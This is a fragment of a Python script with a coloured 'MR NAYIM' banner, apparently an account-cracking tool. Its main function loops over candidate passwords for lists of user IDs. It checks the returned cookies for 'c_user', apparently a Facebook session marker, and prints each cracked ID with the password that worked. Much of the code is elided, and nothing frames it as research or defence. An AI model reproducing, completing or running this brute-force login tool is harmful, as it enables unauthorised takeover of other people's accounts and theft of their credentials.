...
logo=(""" \033[1;34mMR \033[1;37md8b   db  .d8b.  db    db d888888b .88b  d88. 
...
\033[1;37m------------------------------------------------------------
 ...
 \033[1;37m[\033[1;32m+\033[1;37m] VERSION   :  \033[1;33m0.1.3  \x1b[38;5;46mRANDOM \033[1;37m
\033[1;37m------------------------------------------------------------""")               
def line():
    print('\033[1;37m------------------------------------------------------------')
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mNAYIM\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [MR-NAYIM-404] '+cid+' | '+ps+'\33[0;92m')
